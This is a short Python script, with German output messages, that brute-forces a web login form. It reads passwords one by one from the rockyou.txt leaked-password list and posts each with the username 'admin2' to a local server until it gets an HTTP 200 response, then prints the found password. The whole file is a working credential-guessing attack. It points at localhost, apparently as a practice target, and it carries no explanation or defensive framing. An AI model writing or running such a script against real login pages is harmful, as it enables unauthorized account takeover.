import requests

URL = "http://localhost:5000/"

USERNAME = "admin2"

with open("rockyou.txt", "r", encoding="latin-1") as file:

    for count, password in enumerate(file, start=1):

        password = password.strip()

        response = requests.post(
            URL,
            data={
                "username": USERNAME,
                "password": password
            }
        )

        if response.status_code == 200:
            print(f"\nPassword gefunden: {password}")
            print(response.text)
            break

        if count % 1000 == 0:
            print(f"wurden {count} passwords getestet...")